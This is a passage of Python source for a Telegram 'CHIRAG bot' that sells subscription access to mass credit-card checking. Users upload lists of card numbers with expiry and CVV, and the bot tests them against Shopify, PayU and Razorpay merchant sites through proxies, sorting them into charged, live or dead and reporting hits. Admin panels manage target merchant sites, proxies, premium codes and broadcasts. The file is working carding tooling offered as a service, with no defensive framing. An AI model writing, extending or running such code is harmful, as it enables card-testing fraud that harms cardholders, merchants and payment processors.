        await event.reply(premium_emoji(wt), buttons=get_main_menu_keyboard(), parse_mode='html')

# ---------- CALLBACK QUERY ----------
@bot.on(events.CallbackQuery)
async def cb(event):
    uid = event.sender_id
    cid = event.chat_id
    data = event.data.decode('utf-8')
    if is_banned(uid):
        await event.answer("🚫 Banned.", alert=True); return
    if is_maintenance() and not is_admin(uid):
        await event.answer("🔧 Maintenance.", alert=True); return
    if not data.startswith("admin_") and data != "check_join":
        if not await is_user_joined(uid):
            await event.answer("⚠️ Join channel first!", alert=True)
            try:
                await event.edit(premium_emoji("⚠️ <b>Join Required</b>\n\nJoin our channel to use this bot."),
                                 buttons=get_force_join_keyboard(), parse_mode='html')
            except:
                await event.respond(premium_emoji("⚠️ <b>Join Required</b>\n\nJoin our channel."),
                                    buttons=get_force_join_keyboard(), parse_mode='html')
            return
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
    except: un = f"user_{uid}"
    if data == "check_join":
        if await is_user_joined(uid):
            await event.answer("✅ Verified!", alert=True)
            st = await get_user_stats_text(uid, un, cid)
            wt = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 CHIRAG 𝗯𝗼𝘁, @{un}!\n\n{st}"
            try:
                await event.edit(premium_emoji(wt), buttons=get_main_menu_keyboard(), parse_mode='html')
            except:
                await event.respond(premium_emoji(wt), buttons=get_main_menu_keyboard(), parse_mode='html')
        else:
            await event.answer("❌ Not joined yet.", alert=True)
        return
    if data == "show_commands":
        cmds = """<b>📋 BASIC</b>
├ <code>/start</code> - Main menu
├ <code>/help</code> - Help
├ <code>/profile</code> - Your profile
├ <code>/mysites</code> - Your sites
├ <code>/redeem &lt;code&gt;</code> - Redeem code
├ <code>/feedback</code> - Send feedback
└ <code>/cancel</code> - Cancel action

<b>💳 CARD CHECK</b>
├ <code>/cc card|mm|yy|cvv</code> - Single (Shopify)
├ <code>/payu card|mm|yy|cvv</code> - Single (PayU)
├ <code>/payu</code> - Mass (reply .txt)
├ <code>/shopify card|mm|yy|cvv</code> - Single
├ <code>/shopify</code> - Mass (reply .txt)
├ <code>/razorpay card|mm|yy|cvv</code> - Single
├ <code>/razorpay</code> - Mass (reply .txt)
├ <code>/chk</code> - Mass (reply .txt)
├ <code>/auto</code> - Auto (reply .txt)
└ <code>/mcancel</code> - Cancel

<b>🔌 PROXY</b>
├ <code>/proxy</code> - Check proxies
├ <code>/addproxy</code> - Add proxies
├ <code>/rmproxy proxy</code> - Remove
├ <code>/clearproxy</code> - Clear all
└ <code>/getproxy</code> - Get all

<b>👑 Support:</b> @its_chirag_real """
        await event.edit(premium_emoji(cmds), buttons=get_commands_keyboard(), parse_mode='html')
        await event.answer()
    elif data == "main_menu":
        st = await get_user_stats_text(uid, un, cid)
        wt = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 CHIRAG 𝗯𝗼𝘁, @{un}!\n\n{st}"
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.delete()
            await event.respond(premium_emoji(wt), file=WELCOME_IMAGE_PATH, buttons=get_main_menu_keyboard(), parse_mode='html')
        else:
            await event.edit(premium_emoji(wt), buttons=get_main_menu_keyboard(), parse_mode='html')
        await event.answer()
    elif data.startswith("admin_"):
        if not is_admin(uid):
            await event.answer("❌ Admin only", alert=True); return
        action = data.replace("admin_", "")
        if action == "page1":
            admin_state[uid] = {'page': 1}
            await event.edit(premium_emoji("👑 <b>Admin - Page 1</b>"), buttons=get_admin_keyboard(1), parse_mode='html')
            await event.answer()
        elif action == "page2":
            admin_state[uid] = {'page': 2}
            await event.edit(premium_emoji("👑 <b>Admin - Page 2</b>"), buttons=get_admin_keyboard(2), parse_mode='html')
            await event.answer()
        elif action == "page3":
            admin_state[uid] = {'page': 3}
            await event.edit(premium_emoji("👑 <b>Admin - Page 3</b>"), buttons=get_admin_keyboard(3), parse_mode='html')
            await event.answer()
        elif action == "cancel":
            if uid in admin_actions: del admin_actions[uid]
            await event.edit(premium_emoji("❌ Cancelled."), buttons=[Button.inline("🔙 Back", b"admin_page1")], parse_mode='html')
            await event.answer()
        elif action == "back":
            admin_state[uid] = {'page': 1}
            await event.edit(premium_emoji("👑 <b>Admin - Page 1</b>"), buttons=get_admin_keyboard(1), parse_mode='html')
            await event.answer()
        elif action == "listprem":
            pu = load_premium_users()
            txt = "📋 No premium." if not pu else "📋 <b>Premium:</b>\n\n" + "\n".join([f"{i}. <code>{u}</code>" for i, u in enumerate(pu, 1)])
            await event.edit(premium_emoji(txt), buttons=[Button.inline("🔙 Back", b"admin_page1")], parse_mode='html')
            await event.answer()
        elif action == "broadcast":
            admin_actions[uid] = {'action': 'broadcast'}
            await event.edit(premium_emoji("📢 Send broadcast message:"), buttons=[Button.inline("🔙 Cancel", b"admin_cancel")], parse_mode='html')
            await event.answer()
        elif action == "users":
            ufs = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
            uids = [f.replace('user_','').replace('.json','') for f in ufs]
            txt = "📋 No users." if not uids else f"📋 <b>Total: {len(uids)}</b>\n\n" + "\n".join([f"• <code>{u}</code>" for u in uids[:50]])
            await event.edit(premium_emoji(txt), buttons=[Button.inline("🔙 Back", b"admin_page1")], parse_mode='html')
            await event.answer()
        elif action == "sysstats":
            ufs = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
            tc = th = 0
            for fn in ufs:
                with open(fn, 'r') as f:
                    d = json.load(f); tc += d.get('total_checks', 0); th += d.get('successful_checks', 0)
            txt = f"""📊 <b>System Stats</b>

👥 Users: {len(ufs)}
⭐ Premium: {len(load_premium_users())}
💳 Checks: {tc}
💥 Hits: {th}
🌐 Shopify Sites: {len(load_sites())}
💳 Razorpay Sites: {len(load_razorpay_sites())}
🔌 Proxies: {len(load_proxies())}

<b>👑 Support:</b> @its_chirag_real"""
            await event.edit(premium_emoji(txt), buttons=[Button.inline("🔙 Back", b"admin_page2")], parse_mode='html')
            await event.answer()
        elif action == "apistatus":
            sts = []
            for u in CHECKER_API_URLS:
                ok = await check_api_health(u)
                sts.append(f"{u}: {'✅' if ok else '❌'}")
            await event.edit(premium_emoji("📊 <b>APIs</b>\n\n" + "\n".join(sts)), buttons=[Button.inline("🔙 Back", b"admin_page1")], parse_mode='html')
            await event.answer()
        elif action == "maintenance":
            m = toggle_maintenance()
            await event.edit(premium_emoji(f"🔧 Maintenance: {'ON' if m else 'OFF'}"), buttons=[Button.inline("🔙 Back", b"admin_page3")], parse_mode='html')
            await event.answer()
        elif action == "clearsites":
            c = len(load_sites())
            save_sites([])
            await event.edit(premium_emoji(f"🧹 Cleared {c} sites."), buttons=[Button.inline("🔙 Back", b"admin_page2")], parse_mode='html')
            await event.answer()
        elif action == "clearproxies":
            c = len(load_proxies())
            save_proxies([])
            await event.edit(premium_emoji(f"🧹 Cleared {c} proxies."), buttons=[Button.inline("🔙 Back", b"admin_page2")], parse_mode='html')
            await event.answer()
        elif action == "reload":
            await event.edit(premium_emoji("🔄 Reloaded."), buttons=[Button.inline("🔙 Back", b"admin_page3")], parse_mode='html')
            await event.answer()
        else:
            admin_actions[uid] = {'action': action}
            prompts = {
                'addprem': "Send user ID to add as premium.",
                'removeprem': "Send user ID to remove from premium.",
                'userinfo': "Send user ID to get info.",
                'resetstats': "Send user ID to reset stats.",
                'addsite': "Send Shopify site URL to add.",
                'rmsite': "Send Shopify site URL to remove.",
                'addproxy': "Send proxies (one per line).",
                'rmproxy': "Send proxy to remove.",
                'banuser': "Send user ID to ban.",
                'unbanuser': "Send user ID to unban.",
                'deleteuser': "Send user ID to delete.",
                'lastcheck': "Send user ID.",
                'setplan': "Send: user_id plan (7d/30d/unlimited).",
                'addapi': "Send API URL.",
                'removeapi': "Send API number to remove.",
                'importsites': "Reply to .txt file with sites.",
                'importproxies': "Reply to .txt file with proxies.",
                'gencode': "Send plan: 7d, 30d, or unlimited.",
                'masscodes': "Send: plan count (e.g. 7d 50).",
            }
            await event.edit(premium_emoji(prompts.get(action, "Send value.")),
                             buttons=[Button.inline("🔙 Cancel", b"admin_cancel")], parse_mode='html')
            await event.answer()

# ---------- ADMIN INPUT HANDLER ----------
@bot.on(events.NewMessage)
async def admin_input(event):
    uid = event.sender_id
    if uid not in admin_actions: return
    action = admin_actions[uid].get('action')
    txt = event.message.text.strip() if event.message.text else ""
    if action == 'addprem':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid ID."), parse_mode='html'); return
        pu = load_premium_users()
        if txt in pu: await event.reply(premium_emoji(f"⚠️ Already premium."), parse_mode='html')
        else:
            with open(PREMIUM_FILE, 'a') as f: f.write(f"{txt}\n")
            await event.reply(premium_emoji(f"✅ Added {txt}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'removeprem':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid ID."), parse_mode='html'); return
        pu = load_premium_users()
        if txt not in pu: await event.reply(premium_emoji(f"⚠️ Not premium."), parse_mode='html')
        else:
            np = [u for u in pu if u != txt]
            with open(PREMIUM_FILE, 'w') as f:
                for u in np: f.write(f"{u}\n")
            await event.reply(premium_emoji(f"✅ Removed {txt}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'broadcast':
        ufs = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
        uids = [f.replace('user_','').replace('.json','') for f in ufs]
        cnt = 0
        for u in uids:
            try:
                await bot.send_message(int(u), premium_emoji(f"📢 <b>Broadcast</b>\n\n{txt}"), parse_mode='html')
                cnt += 1; await asyncio.sleep(0.1)
            except: pass
        await event.reply(premium_emoji(f"✅ Sent to {cnt} users."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'userinfo':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        uf = f"user_{txt}.json"
        if not os.path.exists(uf): await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            with open(uf, 'r') as f: d = json.load(f)
            t = f"""ℹ️ <b>User Info</b>

🆔 <code>{txt}</code>
⭐ Premium: {'✅' if txt in load_premium_users() else '❌'}
📋 Plan: {d.get('plan', 'free')}
⏳ Expiry: {d.get('plan_expiry', 'N/A')}
💳 Checks: {d.get('total_checks', 0)}
💥 Hits: {d.get('successful_checks', 0)}
📅 Registered: {d.get('registered_at', 'N/A')[:10]}

<b>👑 Support:</b> @its_chirag_real"""
            await event.reply(premium_emoji(t), parse_mode='html')
        del admin_actions[uid]
    elif action == 'resetstats':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        uf = f"user_{txt}.json"
        if not os.path.exists(uf): await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            with open(uf, 'r') as f: d = json.load(f)
            d['total_checks'] = 0; d['successful_checks'] = 0
            with open(uf, 'w') as f: json.dump(d, f, indent=2)
            await event.reply(premium_emoji(f"✅ Reset stats for {txt}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'addsite':
        s = txt.replace('https://','').replace('http://','').rstrip('/')
        sites = load_sites()
        if s in sites: await event.reply(premium_emoji("⚠️ Exists."), parse_mode='html')
        else:
            with open(SITES_FILE, 'a') as f: f.write(f"{s}\n")
            await event.reply(premium_emoji(f"✅ Added {s}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'rmsite':
        s = txt.replace('https://','').replace('http://','').rstrip('/')
        sites = load_sites()
        if s not in sites: await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            save_sites([x for x in sites if x != s])
            await event.reply(premium_emoji(f"✅ Removed {s}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'addproxy':
        ps = [p.strip() for p in txt.split('\n') if p.strip()]
        cur = load_proxies()
        added = 0
        for p in ps:
            if p not in cur:
                with open(PROXY_FILE, 'a') as f: f.write(f"{p}\n")
                added += 1
        await event.reply(premium_emoji(f"✅ Added {added} proxies."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'rmproxy':
        p = txt.strip()
        cur = load_proxies()
        if p not in cur: await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            save_proxies([x for x in cur if x != p])
            await event.reply(premium_emoji("✅ Removed."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'banuser':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        if txt in get_file_lines(BANNED_FILE): await event.reply(premium_emoji("⚠️ Already banned."), parse_mode='html')
        else:
            with open(BANNED_FILE, 'a') as f: f.write(f"{txt}\n")
            await event.reply(premium_emoji(f"🚫 Banned {txt}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'unbanuser':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        bl = get_file_lines(BANNED_FILE)
        if txt not in bl: await event.reply(premium_emoji("⚠️ Not banned."), parse_mode='html')
        else:
            with open(BANNED_FILE, 'w') as f:
                for u in bl:
                    if u != txt: f.write(f"{u}\n")
            await event.reply(premium_emoji(f"✅ Unbanned {txt}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'deleteuser':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        uf = f"user_{txt}.json"
        if os.path.exists(uf):
            os.remove(uf)
            pu = load_premium_users()
            if txt in pu:
                with open(PREMIUM_FILE, 'w') as f:
                    for u in pu:
                        if u != txt: f.write(f"{u}\n")
            await event.reply(premium_emoji(f"🗑️ Deleted {txt}"), parse_mode='html')
        else: await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'lastcheck':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        uf = f"user_{txt}.json"
        if not os.path.exists(uf): await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            with open(uf, 'r') as f: d = json.load(f)
            await event.reply(premium_emoji(f"🕒 Last check: {d.get('last_check_date', 'Never')}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'setplan':
        parts = txt.split()
        if len(parts) != 2: await event.reply(premium_emoji("❌ Usage: user_id plan"), parse_mode='html'); return
        u, p = parts
        if not u.isdigit() or p not in PLANS: await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
        uf = f"user_{u}.json"
        if not os.path.exists(uf): await event.reply(premium_emoji("❌ Not found."), parse_mode='html')
        else:
            with open(uf, 'r') as f: d = json.load(f)
            d['plan'] = p
            d['plan_expiry'] = (datetime.now() + timedelta(days=PLANS[p]['duration_days'])).isoformat()
            with open(uf, 'w') as f: json.dump(d, f, indent=2)
            pu = load_premium_users()
            if p != 'free' and u not in pu:
                with open(PREMIUM_FILE, 'a') as f: f.write(f"{u}\n")
            await event.reply(premium_emoji(f"✅ Set {u} to {p}"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'addapi':
        CHECKER_API_URLS.append(txt)
        await event.reply(premium_emoji(f"✅ Added API."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'removeapi':
        if not txt.isdigit(): await event.reply(premium_emoji("❌ Send number."), parse_mode='html')
        else:
            i = int(txt) - 1
            if 0 <= i < len(CHECKER_API_URLS):
                CHECKER_API_URLS.pop(i)
                await event.reply(premium_emoji("✅ Removed."), parse_mode='html')
            else: await event.reply(premium_emoji("❌ Invalid."), parse_mode='html')
        del admin_actions[uid]
    elif action == 'importsites':
        if not event.reply_to_msg_id: await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html')
        else:
            r = await event.get_reply_message()
            if not r.file or not r.file.name.endswith('.txt'): await event.reply(premium_emoji("❌ Need .txt"), parse_mode='html')
            else:
                fp = await r.download_media()
                with open(fp, 'r') as f: lines = [l.strip() for l in f if l.strip()]
                save_sites(lines)
                await event.reply(premium_emoji(f"✅ Imported {len(lines)} sites."), parse_mode='html')
                os.remove(fp)
        del admin_actions[uid]
    elif action == 'importproxies':
        if not event.reply_to_msg_id: await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html')
        else:
            r = await event.get_reply_message()
            if not r.file or not r.file.name.endswith('.txt'): await event.reply(premium_emoji("❌ Need .txt"), parse_mode='html')
            else:
                fp = await r.download_media()
                with open(fp, 'r') as f: lines = [l.strip() for l in f if l.strip()]
                save_proxies(lines)
                await event.reply(premium_emoji(f"✅ Imported {len(lines)} proxies."), parse_mode='html')
                os.remove(fp)
        del admin_actions[uid]
    elif action == 'gencode':
        p = txt.lower()
        if p not in PLANS: await event.reply(premium_emoji("❌ Invalid plan."), parse_mode='html')
        else:
            c = generate_code(p)
            await event.reply(premium_emoji(f"✅ Code: <code>{c}</code> ({p})"), parse_mode='html')
        del admin_actions[uid]
    elif action == 'masscodes':
        parts = txt.split()
        if len(parts) != 2 or parts[0] not in PLANS or not parts[1].isdigit():
            await event.reply(premium_emoji("❌ Usage: plan count"), parse_mode='html')
        else:
            cs = generate_mass_codes(parts[0], int(parts[1]))
            await event.reply(premium_emoji(f"✅ Generated {len(cs)} codes:\n\n" + "\n".join([f"<code>{c}</code>" for c in cs])), parse_mode='html')
        del admin_actions[uid]

# ---------- FEEDBACK INPUT ----------
@bot.on(events.NewMessage)
async def fb_input(event):
    uid = event.sender_id
    if str(uid) not in feedback_state: return
    if feedback_state[str(uid)].get('step') != 'awaiting_feedback': return
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
    except: un = f"user_{uid}"
    if event.message.photo:
        pp = await event.message.download_media()
        txt = event.message.text or "No text"
        await send_feedback_log(uid, un, txt, pp)
        try: os.remove(pp)
        except: pass
        await event.reply(premium_emoji("✅ Feedback sent!"), parse_mode='html')
    else:
        txt = event.message.text
        if not txt:
            await event.reply(premium_emoji("❌ Send text."), parse_mode='html'); return
        await send_feedback_log(uid, un, txt)
        await event.reply(premium_emoji("✅ Feedback sent!"), parse_mode='html')
    del feedback_state[str(uid)]

# ---------- /admin ----------
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_cmd(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(premium_emoji("❌ Admin only."), parse_mode='html'); return
    await event.reply(premium_emoji("👑 <b>Admin Panel</b>"), buttons=get_admin_keyboard(1), parse_mode='html')

# ---------- /help ----------
@bot.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    ht = """<b>📋 Commands</b>

<b>Card Check:</b>
├ <code>/cc card|mm|yy|cvv</code> - Shopify single
├ <code>/payu card|mm|yy|cvv</code> - PayU single
├ <code>/payu</code> - PayU mass (reply .txt)
├ <code>/shopify card|mm|yy|cvv</code> - Shopify single
├ <code>/shopify</code> - Shopify mass (reply .txt)
├ <code>/razorpay card|mm|yy|cvv</code> - Razorpay single
├ <code>/razorpay</code> - Razorpay mass (reply .txt)
├ <code>/chk</code> - Mass (reply .txt)
├ <code>/auto</code> - Auto (reply .txt)
└ <code>/mcancel</code> - Cancel

<b>Other:</b>
├ <code>/profile</code> - Your profile
├ <code>/mysites</code> - Your sites
├ <code>/redeem &lt;code&gt;</code> - Redeem
├ <code>/feedback</code> - Feedback
├ <code>/proxy</code> - Check proxies
├ <code>/addproxy</code> - Add proxies
├ <code>/getproxy</code> - Get proxies
└ <code>/cancel</code> - Cancel

<b>👑 Support:</b> @its_chirag_real"""
    await event.reply(premium_emoji(ht), buttons=get_commands_keyboard(), parse_mode='html')

# ---------- /profile ----------
@bot.on(events.NewMessage(pattern='/profile'))
async def profile_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    uf = f"user_{uid}.json"
    d = {}
    if os.path.exists(uf):
        with open(uf, 'r') as f: d = json.load(f)
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
        fn = s.first_name if s.first_name else "User"
    except: un, fn = f"user_{uid}", "User"
    t = f"""<b>👤 Profile</b>

├ 🆔 <code>{uid}</code>
├ 👤 {fn}
├ 📝 @{un}
├ 📊 Checks: {d.get('total_checks', 0)}
├ 💥 Hits: {d.get('successful_checks', 0)}
├ ⭐ Premium: {'✅' if is_premium(uid) or is_admin(uid) else '❌'}
├ 📋 Plan: {get_user_plan(uid)}
├ ⏳ Expiry: {(d.get('plan_expiry', '') or 'N/A')[:10]}
└ 📅 Registered: {d.get('registered_at', 'N/A')[:10]}

<b>👑 Support:</b> @its_chirag_real"""
    await event.reply(premium_emoji(t), buttons=get_commands_keyboard(), parse_mode='html')

# ---------- /mysites ----------
@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    ss = load_sites()
    rz = load_razorpay_sites()
    if not ss and not rz: await event.reply(premium_emoji("❌ No sites."), parse_mode='html'); return
    t = f"📋 <b>Shopify ({len(ss)}):</b>\n" + "\n".join([f"• {s}" for s in ss[:20]])
    t += f"\n\n💳 <b>Razorpay ({len(rz)}):</b>\n" + "\n".join([f"• {s}" for s in rz[:20]])
    await event.reply(premium_emoji(t), parse_mode='html')

# ---------- /razorpay ----------
@bot.on(events.NewMessage(pattern='/razorpay'))
async def razorpay_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    rz = load_razorpay_sites()
    px = load_proxies()
    if not rz: await event.reply(premium_emoji("❌ No Razorpay sites."), parse_mode='html'); return
    if not px: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    
    if event.reply_to_msg_id:
        r = await event.get_reply_message()
        if not r.file or not r.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html'); return
        st = await event.reply(premium_emoji("🔄 Processing..."), parse_mode='html')
        fp = await r.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await st.edit(premium_emoji("❌ No cards."), parse_mode='html'); os.remove(fp); return
        if len(cards) > 5000: cards = cards[:5000]
        os.remove(fp)
        total = len(cards)
        try:
            s = await event.get_sender()
            un = s.username if s.username else f"user_{uid}"
            await send_log('razorpay_check', uid, un, f'Razorpay mass: {total} cards', {'Total': total})
        except: pass
        await st.edit(premium_emoji(f"🔄 Starting Razorpay for {total} cards..."), parse_mode='html')
        results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
        key = f"razorpay_{uid}_{st.id}"
        active_sessions[key] = {'paused': False}
        try:
            lt = [time.time()]
            for i in range(0, len(cards), 5):
                if key not in active_sessions: break
                while active_sessions.get(key, {}).get('paused', False):
                    await asyncio.sleep(1)
                    if key not in active_sessions: break
                for card in cards[i:i+5]:
                    if key not in active_sessions: break
                    r = await check_card_razorpay_with_retry(card, load_razorpay_sites(), load_proxies(), 1)
                    results['checked'] += 1
                    if r['status'] == 'Charged':
                        results['charged'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Charged', un)
                        except: pass
                    elif r['status'] == 'Approved':
                        results['approved'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Approved', un)
                        except: pass
                    else:
                        results['dead'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, False)
                    now = time.time()
                    if now - lt[0] >= 1.0:
                        lt[0] = now
                        if key in active_sessions:
                            try: await update_payu_progress(uid, st.id, results, results['checked'])
                            except: pass
                    await asyncio.sleep(0.2)
        except Exception as e:
            await bot.send_message(uid, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        finally:
            if key in active_sessions: del active_sessions[key]
            try: await st.delete()
            except: pass
            await send_payu_final_results(uid, results)
    else:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/razorpay card|mm|yy|cvv</code> or reply to .txt"), parse_mode='html'); return
        cards = extract_cc(args[1].strip())
        if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
        card = cards[0]
        st = await event.reply(premium_emoji(f"<b>⚡ Checking...</b>\n💳 <code>{card}</code>"), parse_mode='html')
        try:
            r = await check_card_razorpay_with_retry(card, load_razorpay_sites(), load_proxies(), 3)
            increment_user_checks(uid)
            await save_user_stats(uid, r['status'] in ['Charged', 'Approved'])
            brand, bt, lv, bk, cn, fl = await get_bin_info(card.split('|')[0])
            em = "✅" if r['status'] == 'Charged' else ("🔥" if r['status'] == 'Approved' else "❌")
            stt = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if r['status'] == 'Charged' else ("𝐋𝐢𝐯𝐞" if r['status'] == 'Approved' else "𝐃𝐞𝐚𝐝")
            fr = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲</b>
<blockquote>{em} Status: {stt}</blockquote>
<blockquote>💳 <code>{r['card']}</code></blockquote>
<blockquote>📝 {r['message'][:150]}</blockquote>
<blockquote>🌐 {r.get('gateway', 'razorpay')} | 💰 {r.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍</b>
<pre>{brand} - {bt} - {lv}
{bk} | {cn} {fl}</pre>
<b>👑 Support:</b> @its_chirag_real"""
            await st.edit(premium_emoji(fr), parse_mode='html')
            if r['status'] in ['Charged', 'Approved']:
                try:
                    s = await event.get_sender()
                    un = s.username if s.username else f"user_{uid}"
                    await send_realtime_hit(uid, r, r['status'], un)
                except: pass
        except Exception as e:
            await st.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ---------- /shopify ----------
@bot.on(events.NewMessage(pattern='/shopify'))
async def shopify_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    ss = load_sites()
    px = load_proxies()
    if not ss: await event.reply(premium_emoji("❌ No sites."), parse_mode='html'); return
    if not px: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    
    if event.reply_to_msg_id:
        r = await event.get_reply_message()
        if not r.file or not r.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html'); return
        st = await event.reply(premium_emoji("🔄 Processing..."), parse_mode='html')
        fp = await r.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await st.edit(premium_emoji("❌ No cards."), parse_mode='html'); os.remove(fp); return
        if len(cards) > 5000: cards = cards[:5000]
        os.remove(fp)
        total = len(cards)
        try:
            s = await event.get_sender()
            un = s.username if s.username else f"user_{uid}"
            await send_log('shopify_check', uid, un, f'Shopify mass: {total}', {'Total': total})
        except: pass
        await st.edit(premium_emoji(f"🔄 Starting Shopify for {total} cards..."), parse_mode='html')
        results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
        key = f"shopify_{uid}_{st.id}"
        active_sessions[key] = {'paused': False}
        try:
            lt = [time.time()]
            for i in range(0, len(cards), 5):
                if key not in active_sessions: break
                while active_sessions.get(key, {}).get('paused', False):
                    await asyncio.sleep(1)
                    if key not in active_sessions: break
                for card in cards[i:i+5]:
                    if key not in active_sessions: break
                    r = await check_card_shopify_with_retry(card, load_sites(), load_proxies(), 1)
                    results['checked'] += 1
                    if r['status'] == 'Charged':
                        results['charged'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Charged', un)
                        except: pass
                    elif r['status'] == 'Approved':
                        results['approved'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Approved', un)
                        except: pass
                    else:
                        results['dead'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, False)
                    now = time.time()
